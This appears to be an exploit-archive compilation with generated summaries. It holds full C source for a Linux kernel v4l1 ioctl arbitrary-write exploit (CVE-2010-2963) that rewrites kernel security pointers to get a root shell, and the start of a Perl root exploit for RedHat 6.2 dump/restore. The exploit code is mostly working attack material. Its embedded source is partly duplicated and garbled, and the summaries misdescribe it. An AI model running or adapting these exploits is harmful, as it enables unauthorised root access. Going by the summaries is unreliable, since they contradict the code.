// #<-- Publish Date --># // 2010-10-28 // #<-- Technical Document Summary (TDS) --># // The exploit leverages an arbitrary write memory function via a v4l1 compatible ioctl to overwrite kernel memory. It targets a vulnerability in the Linux kernel's video device handling code that permits writing arbitrary data to user-controlled memory locations. The affected component is the VIDIOCSMICROCODE32 ioctl mechanism within the Linux kernel video subsystem. The exploit writes a malicious payload to a null page, potentially corrupting kernel state. No successful exploitation is demonstrated in the source; it only describes the vulnerability and mechanism. // #<-- Layman's Document Summary (LDS) --># // The weakness allows an attacker to write arbitrary data into kernel memory through a vulnerable ioctl command. This could enable privilege escalation or system compromise if the overwritten memory contains critical structures. The affected component is the Linux kernel's video device driver, specifically the v4l1 compatibility layer. The exploit writes to a user-controlled destination address without validation. // #<-- Key Words (KW) --># // Linux Kernel 2.6.36, VIDIOCSMICROCODE32, ioctl, arbitrary memory write, super_memcpy, cap_header_t, DEVICE, syscall, video_code32, video_tuner // #<-- Related Terms --># // arbitrary write vulnerability, kernel memory overwrite, ioctl exploitation, v4l1 compatibility, null page, exploit mechanism, Linux kernel driver, arbitrary data injection // #<-- Entities/Attributes --># // Software: Linux Kernel 2.6.36, Source code: vyakarana.c, Function: super_memcpy, Device: /dev/video0, Header: cap_header_t, Variable: destination, Value: value, Length: length, Command: ./vyakarana // #<-- Vulnerability Type --># // Arbitrary write memory write via v4l1 compat ioctl // #<-- Original Content --># // source: https://www.securityfocus.com/bid/44242/info /* * CVE-2010-2963 * Arbitrary write memory write via v4l1 compat ioctl. * Kees Cook <kees@ubuntu.com> * * greets to drosenberg, spender, taviso */ #define _GNU_SOURCE #include <stdio.h> #include <unistd.h> #include <stdlib.h> #include <fcntl.h> #include <sys/types.h> #include "exp_framework.h" #include <stdint.h> #include <string.h> #include <poll.h> #include <sys/ioctl.h> #include <sys/ipc.h> #include <sys/msg.h> #include <sys/types.h> #include <linux/videodev.h> #include <syscall.h> #include <sys/capability.h> struct cap_header_t { uint32_t version; int pid; }; #define DEVICE "/dev/video0" struct exploit_state *exp_state; char *desc = "Vyakarana: Linux v4l1 compat ioctl arbitrary memory write"; int requires_null_page = 0; int built = 0; int super_memcpy(unsigned long destination, void *source, int length) { struct video_code vc = { }; struct video_tuner tuner = { }; int dev; unsigned int code; char cmd[80]; if (!built) { FILE *source; char *sourcecode = "/*
\ * CVE-2010-2963: Write kernel memory via v4l compat ioctl.
\ * Oct 11, 2010 Kees Cook <kees@ubuntu.com>
\ *
\ */
\ #define _GNU_SOURCE
\ #include <stdio.h>
\ #include <stdlib.h>
\ #include <stdint.h>
\ #include <unistd.h>
\ #include <sys/types.h>
\ #include <sys/stat.h>
\ #include <fcntl.h>
\ #include <string.h>
\ #include <sys/ioctl.h>
\ #include <sys/mman.h>
\ #include <assert.h>
\ #include <malloc.h>
\ #include <sys/types.h>
\ #include <linux/videodev.h>
\ #include <syscall.h>
\ 
\ #define DEVICE "/dev/video0"
\ 
\ struct video_code32 {
\ char loadwhat[16];
\ int datasize;
\ int padding;
\ uint64_t data;
\ };
\ 
\ int super_memcpy(uint64_t destination, void *source, int length)
\ {
\ struct video_code32 vc = { };
\ struct video_tuner tuner = { };
\ int dev;
\ unsigned int code;
\ 
\ if ( (dev=open(DEVICE, O_RDWR)) < 0) {
\ perror(DEVICE);
\ return 1;
\ }
\ 
\ vc.datasize = length;
\ vc.data = (uint64_t)(uintptr_t)source;
\ 
\ memset(&tuner, 0xBB, sizeof(tuner));
\

};
\ 
\ int super_memcpy(uint64_t destination, void *source, int length)
\ {
\ struct video_code32 vc = { };
\ struct video_tuner tuner = { };
\ int dev;
\ unsigned int code;
\ 
\ if ( (dev=open(DEVICE, O_RDWR)) < 0) {
\ perror(DEVICE);
\ return 1;
\ }
\ 
\ vc.datasize = length;
\ vc.data = (uint64_t)(uintptr_t)source;
\ 
\ memset(&tuner, 0xBB, sizeof(tuner));
\ 
\ // manual union, since a real union won't do ptrs for 64bit
\ uint64_t *ptr = (uint64_t*)(&(tuner.name[20]));
\ *ptr = destination;
\ 
\ // beat memory into the stack...
\ code = VIDIOCSTUNER;
\ syscall(54, dev, code, &tuner);
\ syscall(54, dev, code, &tuner);
\ syscall(54, dev, code, &tuner);
\ syscall(54, dev, code, &tuner);
\ syscall(54, dev, code, &tuner);
\ syscall(54, dev, code, &tuner);
\ 
\ code = 0x4020761b; // VIDIOCSMICROCODE32 (why isn't this VIDIOCSMICROCODE?)
\ syscall(54, dev, code, &vc);
\ 
\ return 0;
\ }
\ 
\ int main(int argc, char *argv[])
\ {
\ uint64_t destination = strtoull(argv[1], NULL, 16);
\ uint64_t value = strtoull(argv[2], NULL, 16);
\ int length = atoi(argv[3]);
\ if (length > sizeof(value))
\ length = sizeof(value);
\ return super_memcpy(destination, &value, length);
\ }
\ "; if (!(source = fopen("vyakarana.c","w"))) { fprintf(stderr, "cannot write source
"); return 1; } fwrite(sourcecode, strlen(sourcecode), 1, source); fclose(source); if (system("gcc -Wall -m32 vyakarana.c -o vyakarana") != 0) { fprintf(stderr, "cannot build source
"); return 1; } built = 1; } printf("Writing to %p (len %d): ", (void*)destination, length); for (dev=0; dev<length; dev++) { printf("0x%02x ", *((unsigned char*)source+dev)); } printf("
"); sprintf(cmd, "./vyakarana %lx %lx 8", (uint64_t)(uintptr_t)destination, *(uint64_t*)source); return system(cmd); } int get_exploit_state_ptr(struct exploit_state *ptr) { exp_state = ptr; return 0; } unsigned long default_sec; unsigned long target; unsigned long restore; int prepare(unsigned char *buf) { unsigned long addr; if (sizeof(long)!=8) { printf("Not enough bits
"); return 1; } printf("Reticulating splines...
"); addr = exp_state->get_kernel_sym("security_ops"); default_sec = exp_state->get_kernel_sym("default_security_ops"); restore = exp_state->get_kernel_sym("cap_capget"); // reset security_ops super_memcpy(addr, &default_sec, sizeof(void*)); // aim capget to enlightenment payload target = default_sec + ((11 + sizeof(void*) -1) / sizeof(void*))*sizeof(void*) + (2 * sizeof(void*)); super_memcpy(target, &(exp_state->own_the_kernel), sizeof(void*)); return 0; } int trigger(void) { struct cap_header_t hdr; uint32_t data[3]; printf("Skipping school...
"); hdr.version = _LINUX_CAPABILITY_VERSION_1; hdr.pid = 1; capget((cap_user_header_t)&hdr, (cap_user_data_t)data); return 1; } int post(void) { printf("Restoring grammar...
"); // restore security op pointer super_memcpy(target, &restore, sizeof(void*)); return RUN_ROOTSHELL; }

# #<-- Publish Date --># # 2000-11-16 # #<-- Technical Document Summary (TDS) --># # The exploit uses a Perl script to invoke system commands via the `system` function. It leverages a privilege escalation technique by calling `setuid(0)` and `setgid(0)` after executing a shell command. The vulnerability stems from improper handling of user input in command argument processing, allowing arbitrary command execution with elevated privileges. The affected component is a local Linux utility for restoring and dumping system backups. The exploit performs actions such as creating a temporary script, setting root ownership, and invoking `/bin/sh` to achieve system access. Not specified in source. # #<-- Layman's Document Summary (LDS) --># # This vulnerability allows an attacker to gain higher privileges by exploiting a flaw in how user-supplied input is processed. The script uses command-line arguments to trigger different backup restoration tools, enabling the execution of arbitrary commands as the root user. It checks for the existence of specific executables and conditionally performs privilege escalation steps. Not specified in source. # #<-- Key Words (KW) --># # technical document summary, local privilege escalation, RedHat 6.2, exploit of restore and dump utility, command injection, setuid, setgid, root elevation # #<-- Related Terms --># # RedHat Linux, dump, static, restore, privilege escalation, setuid, shell, chown, system call, Perl script # #<-- Entities/Attributes --># # RedHat 6.2, /sbin/dump, /sbin/restore, /sbin/restore.static, Perl, system, temporary file, chown, chmod # #<-- Vulnerability Type --># # Local privilege escalation, command injection, setuid binary, root elevation, exploit via argument parsing # #<-- Original Content --># #!/usr/bin/perl # perl exploit of restore and dump # redhat linux 6.2 # written by tlabs # Use at your discretion $EXPORT1="TAPE=garbage:garbage" ; $EXPORT2="RSH=./hey" ; sub USAGE { print "$0 <type>
1=dump 2=dump.static 3=restore 4=restore.staic
Your choice innit;)
Written by Tlabs
